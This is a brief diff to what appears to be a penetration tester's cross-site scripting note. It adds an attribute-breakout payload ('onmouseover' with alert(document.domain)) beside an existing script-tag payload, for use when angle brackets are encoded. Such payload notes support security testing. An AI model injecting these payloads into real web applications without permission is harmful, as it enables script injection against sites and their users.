@@ -9,3 +9,5 @@ but filters http/https:
 
 :::html
 <script>alert(document.domain);</script>                 ---- when the input is in widget
+
+123" onmouseover="alert(document.domain);                     when < and > are encoded as &lt and &gt use this payload
